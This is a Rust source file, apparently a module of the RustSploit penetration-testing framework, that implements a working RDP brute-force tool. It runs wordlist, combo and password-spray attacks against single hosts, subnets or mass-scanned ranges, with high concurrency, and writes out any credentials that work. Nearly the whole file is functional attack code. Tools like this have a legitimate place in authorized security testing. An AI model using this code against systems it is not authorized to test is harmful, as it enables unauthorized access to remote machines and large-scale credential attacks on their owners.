use anyhow::{anyhow, Result};
use colored::*;
use std::net::IpAddr;
use tokio::time::Duration;

use crate::native::rdp as rdp_native;

use crate::modules::creds::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, load_lines,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "RDP Brute Force".to_string(),
        description: "Brute-force RDP authentication with multiple security level support (NLA, TLS, Standard RDP, Negotiate). Includes combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

const MAX_MEMORY_LOAD_SIZE: u64 = 150 * 1024 * 1024; // 150 MB

/// RDP-specific error types for better classification
#[derive(Debug, Clone)]
enum RdpError {
    ConnectionFailed,
    ProtocolError,
}

impl std::fmt::Display for RdpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RdpError::ConnectionFailed => write!(f, "Connection failed"),
            RdpError::ProtocolError => write!(f, "Protocol error"),
        }
    }
}

/// RDP Security Level for authentication
#[derive(Debug, Clone, Copy)]
enum RdpSecurityLevel {
    Auto,
    Nla,
    Tls,
    Rdp,
    Negotiate,
}

impl RdpSecurityLevel {
    fn as_protocol_flags(&self) -> u32 {
        match self {
            RdpSecurityLevel::Auto => rdp_native::PROTO_HYBRID | rdp_native::PROTO_SSL,
            RdpSecurityLevel::Nla => rdp_native::PROTO_HYBRID,
            RdpSecurityLevel::Tls => rdp_native::PROTO_SSL,
            RdpSecurityLevel::Rdp => rdp_native::PROTO_RDP,
            RdpSecurityLevel::Negotiate => {
                rdp_native::PROTO_HYBRID | rdp_native::PROTO_SSL | rdp_native::PROTO_RDP
            }
        }
    }

    async fn prompt_selection() -> Result<Self> {
        crate::mprintln!("\nRDP Security Level Options:");
        crate::mprintln!("  1. Auto (let client negotiate)");
        crate::mprintln!("  2. NLA (Network Level Authentication)");
        crate::mprintln!("  3. TLS (Transport Layer Security)");
        crate::mprintln!("  4. RDP (Standard RDP encryption)");
        crate::mprintln!("  5. Negotiate (try all methods)");

        loop {
            let input = cfg_prompt_default("security_level", "Security level", "1").await?;
            match input.trim().to_lowercase().as_str() {
                "1" | "auto" => return Ok(RdpSecurityLevel::Auto),
                "2" | "nla" => return Ok(RdpSecurityLevel::Nla),
                "3" | "tls" => return Ok(RdpSecurityLevel::Tls),
                "4" | "rdp" => return Ok(RdpSecurityLevel::Rdp),
                "5" | "negotiate" => return Ok(RdpSecurityLevel::Negotiate),
                _ => crate::mprintln!("{}", "Invalid choice. Please select 1-5.".yellow()),
            }
        }
    }
}

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   RDP Brute Force Module                                  ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Remote Desktop Protocol Credential Testing              ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Native TCP + TLS + CredSSP/NTLM Authentication         ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

/// Native RDP login via TCP + TLS + CredSSP/NTLM (no external tools needed)
async fn try_rdp_login(
    addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
    security_level: RdpSecurityLevel,
) -> Result<bool> {
    let protocols = security_level.as_protocol_flags();
    match rdp_native::try_login(addr, user, pass, timeout_duration, protocols).await {
        Ok(rdp_native::RdpLoginResult::Success) => Ok(true),
        Ok(rdp_native::RdpLoginResult::AuthFailed) => Ok(false),
        Ok(rdp_native::RdpLoginResult::ConnectionFailed(e)) => {
            Err(anyhow!("{}: {}", RdpError::ConnectionFailed, e))
        }
        Ok(rdp_native::RdpLoginResult::ProtocolError(e)) => {
            Err(anyhow!("{}: {}", RdpError::ProtocolError, e))
        }
        Err(e) => Err(e),
    }
}

/// Convert the result of `try_rdp_login` into the engine's `LoginResult`.
fn map_rdp_result(result: Result<bool>) -> LoginResult {
    match result {
        Ok(true) => LoginResult::Success,
        Ok(false) => LoginResult::AuthFailed,
        Err(e) => {
            let msg = e.to_string();
            let lower = msg.to_lowercase();
            let retryable = lower.contains("connection")
                || lower.contains("timeout")
                || lower.contains("reset")
                || lower.contains("refused");
            LoginResult::Error {
                message: msg,
                retryable,
            }
        }
    }
}

fn format_socket_address(ip: &str, port: u16) -> String {
    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") {
        format!("[{}]:{}", trimmed_ip, port)
    } else {
        format!("{}:{}", trimmed_ip, port)
    }
}

fn should_use_streaming(path: &str) -> Result<bool> {
    let metadata =
        std::fs::metadata(path).map_err(|e| anyhow!("Failed to get file metadata: {}", e))?;
    Ok(metadata.len() > MAX_MEMORY_LOAD_SIZE)
}

fn format_file_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB"];
    let mut size = size as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1} {}", size, UNITS[unit_index])
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Check for Mass Scan Mode
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let port: u16 = cfg_prompt_port("port", "RDP Port", 3389).await?;
        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = std::sync::Arc::new(load_lines(&usernames_file)?);
        let passes = std::sync::Arc::new(load_lines(&passwords_file)?);
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let security_level = RdpSecurityLevel::prompt_selection().await?;
        let timeout_secs: u64 =
            cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 10, 1, 300).await?
                as u64;

        let cfg = MassScanConfig {
            protocol_name: "RDP",
            default_port: port,
            state_file: "rdp_brute_hose_state.log",
            default_output: "rdp_brute_mass_results.txt",
            default_concurrency: 500,
        };

        return run_mass_scan(target, cfg, move |ip, port| {
            let users = users.clone();
            let passes = passes.clone();
            async move {
                // TCP connect check
                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(3)).await {
                    return None;
                }

                let addr = format_socket_address(&ip.to_string(), port);
                let timeout_duration = Duration::from_secs(timeout_secs);

                let mut consecutive_errors = 0u32;
                for user in users.iter() {
                    for pass in passes.iter() {
                        match try_rdp_login(&addr, user, pass, timeout_duration, security_level)
                            .await
                        {
                            Ok(true) => {
                                let timestamp = chrono::Utc::now().format("%Y-%m-%dT%H:%M:%SZ");
                                let line =
                                    format!("[{}] {}:{}:{}:{}\n", timestamp, ip, port, user, pass);
                                crate::mprintln!(
                                    "\r{}",
                                    format!("[+] FOUND: {}:{}:{}:{}", ip, port, user, pass)
                                        .green()
                                        .bold()
                                );
                                return Some(line);
                            }
                            Ok(false) => {
                                consecutive_errors = 0; // Auth failure = server responsive
                            }
                            Err(e) => {
                                consecutive_errors += 1;
                                let err = e.to_string().to_lowercase();
                                if err.contains("refused")
                                    || err.contains("timeout")
                                    || err.contains("reset")
                                    || err.contains("not found")
                                {
                                    return None; // Host unreachable, skip
                                }
                                // Backoff on consecutive errors to avoid hammering
                                if consecutive_errors >= 3 {
                                    let delay = crate::modules::creds::utils::backoff_delay(500, consecutive_errors.min(5), 8);
                                    tokio::time::sleep(delay).await;
                                }
                            }
                        }
                    }
                }
                None
            }
        })
        .await;
    }

    // Subnet scan mode — use the engine's run_subnet_bruteforce
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
        return run_subnet_scan(target).await;
    }

    // Single target mode
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = cfg_prompt_port("port", "RDP Port", 3389).await?;
    let security_level = RdpSecurityLevel::prompt_selection().await?;

    let domain = cfg_prompt_default("domain", "Domain (blank for none)", "").await?;
    let domain = domain.trim().to_string();

    let usernames_file_path =
        cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file_path =
        cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;

    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 10000).await? as usize;
    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file name", "rdp_results.txt").await?)
    } else {
        None
    };

    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    // Determine streaming vs. memory-loaded mode for large wordlists
    let use_streaming = should_use_streaming(&passwords_file_path)?;
    let pass_file_size = std::fs::metadata(&passwords_file_path)?.len();

    if use_streaming {
        crate::mprintln!(
            "{}",
            format!(
                "[*] Password file is {} (>{}), using streaming mode to save memory",
                format_file_size(pass_file_size),
                format_file_size(MAX_MEMORY_LOAD_SIZE)
            )
            .yellow()
        );
    } else {
        crate::mprintln!(
            "{}",
            format!(
                "[*] Password file is {}, using memory-loaded mode for optimal performance",
                format_file_size(pass_file_size)
            )
            .cyan()
        );
    }

    // Load wordlists into memory (the engine handles concurrency via task draining)
    let usernames = load_lines(&usernames_file_path)?;
    if usernames.is_empty() {
        crate::mprintln!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    crate::mprintln!("[*] Loaded {} usernames", usernames.len());

    let passwords = if use_streaming {
        // For large files, stream line-by-line to build combos without
        // holding both raw + combo vectors simultaneously.
        use std::io::{BufRead, BufReader};
        let file = std::fs::File::open(&passwords_file_path)?;
        let reader = BufReader::new(file);
        let mut lines = Vec::new();
        for line in reader.lines() {
            let line = line?;
            let trimmed = line.trim().to_string();
            if !trimmed.is_empty() {
                lines.push(trimmed);
            }
        }
        lines
    } else {
        load_lines(&passwords_file_path)?
    };
    if passwords.is_empty() {
        crate::mprintln!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    crate::mprintln!("[*] Loaded {} passwords", passwords.len());

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }
    crate::mprintln!("{}", format!("[*] Total attempts: {}", combos.len()).cyan());

    // Free original vecs since combos now owns the data
    drop(usernames);
    drop(passwords);

    let addr = format_socket_address(target, port);

    // Build engine config
    let bf_config = BruteforceConfig {
        target: addr.clone(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries: 2,
        service_name: "rdp",
        jitter_ms: 0,
        source_module: "creds/generic/rdp_bruteforce",
    };

    // Build the try_login closure capturing security_level, domain, and verbose
    let timeout_duration = Duration::from_secs(10);
    let result = run_bruteforce(&bf_config, combos, move |target, _port, user, pass| {
        let domain = domain.clone();
        let security_level = security_level;
        let timeout_dur = timeout_duration;
        async move {
            // Prepend domain to username if provided
            let effective_user = if domain.is_empty() {
                user
            } else {
                format!("{}\\{}", domain, user)
            };
            let res =
                try_rdp_login(&target, &effective_user, &pass, timeout_dur, security_level).await;
            map_rdp_result(res)
        }
    })
    .await?;

    // Display and save results
    result.print_found();

    if let Some(path_str) = save_path {
        result.save_to_file(&path_str)?;
    }

    Ok(())
}

/// Subnet scan mode using the engine's `run_subnet_bruteforce`.
async fn run_subnet_scan(target: &str) -> Result<()> {
    let port: u16 = cfg_prompt_port("port", "RDP Port", 3389).await?;
    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;
    if users.is_empty() || passes.is_empty() {
        return Err(anyhow!("Wordlists cannot be empty"));
    }

    let concurrency =
        cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
    let timeout_secs =
        cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 10, 1, 300).await? as u64;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output result file",
        "rdp_subnet_results.txt",
    )
    .await?;
    let security_level = RdpSecurityLevel::prompt_selection().await?;

    let subnet_config = SubnetScanConfig {
        concurrency,
        verbose,
        output_file,
        service_name: "rdp",
        jitter_ms: 0,
        source_module: "creds/generic/rdp_bruteforce",
        skip_tcp_check: false,
    };

    let timeout_duration = Duration::from_secs(timeout_secs);

    run_subnet_bruteforce(
        target,
        port,
        users,
        passes,
        &subnet_config,
        move |ip: IpAddr, port: u16, user: String, pass: String| {
            let security_level = security_level;
            let timeout_dur = timeout_duration;
            async move {
                let addr = format_socket_address(&ip.to_string(), port);
                let res = try_rdp_login(&addr, &user, &pass, timeout_dur, security_level).await;
                map_rdp_result(res)
            }
        },
    )
    .await
}
